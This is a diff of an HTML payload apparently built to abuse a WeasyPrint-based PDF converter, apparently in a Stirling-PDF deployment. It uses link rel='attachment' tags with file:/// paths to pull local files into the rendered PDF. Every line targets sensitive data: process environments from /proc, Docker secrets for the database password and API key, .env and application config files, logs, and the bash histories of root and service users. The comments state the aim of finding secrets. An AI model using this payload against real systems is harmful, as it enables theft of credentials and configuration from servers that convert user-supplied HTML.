@@ -5,41 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
 </head>
-<!-- Parent process (PID 9 - likely the Java application) -->
-<link rel="attachment" href="file:///proc/9/environ">
-<link rel="attachment" href="file:///proc/9/cmdline">
-<link rel="attachment" href="file:///proc/9/status">
-
-<!-- Init process in container -->
+<!-- Get parent Java process environment (PID 1 or parent of WeasyPrint) -->
 <link rel="attachment" href="file:///proc/1/environ">
 <link rel="attachment" href="file:///proc/1/cmdline">
+<link rel="attachment" href="file:///proc/1/status">
 
-<!-- Process memory maps (reveals loaded files and paths) -->
-<link rel="attachment" href="file:///proc/self/maps">
-<link rel="attachment" href="file:///proc/9/maps">
-
-<!-- Additional configs from mounted directory -->
-<link rel="attachment" href="file:///configs/docker-compose.yml">
-<link rel="attachment" href="file:///configs/.env">
+<!-- Application configuration files -->
+<link rel="attachment" href="file:///usr/src/app/application.yml">
+<link rel="attachment" href="file:///usr/src/app/application.properties">
 <link rel="attachment" href="file:///configs/application.yml">
 
-<!-- Network info -->
-<link rel="attachment" href="file:///etc/resolv.conf">
-<link rel="attachment" href="file:///proc/net/tcp">
-<link rel="attachment" href="file:///proc/net/udp">
+<!-- Bash histories (may reveal secrets from setup/testing) -->
+<link rel="attachment" href="file:///home/stirlingpdfuser/.bash_history">
+<link rel="attachment" href="file:///home/gradle/.bash_history">
+<link rel="attachment" href="file:///root/.bash_history">
 
-<!-- Cgroup info (container orchestration details) -->
-<link rel="attachment" href="file:///proc/self/cgroup">
+<!-- Java application logs -->
+<link rel="attachment" href="file:///usr/src/app/logs/spring.log">
+<link rel="attachment" href="file:///usr/src/app/logs/application.log">
 
-<!-- Check for Docker secrets -->
+<!-- Docker secrets (if mounted) -->
 <link rel="attachment" href="file:///run/secrets/db_password">
 <link rel="attachment" href="file:///run/secrets/api_key">
 
-<!-- Application working directory -->
-<link rel="attachment" href="file:///usr/src/app/.env">
-<link rel="attachment" href="file:///usr/src/app/application.properties">
+<!-- More configs exploration -->
+<link rel="attachment" href="file:///configs/docker-compose.yml">
+<link rel="attachment" href="file:///configs/.env">
 
-<!-- User bash history -->
-<link rel="attachment" href="file:///home/stirlingpdfuser/.bash_history">
+<!-- Environment files -->
+<link rel="attachment" href="file:///usr/src/app/.env">
+<link rel="attachment" href="file:///.env">
 </body>
 </html>
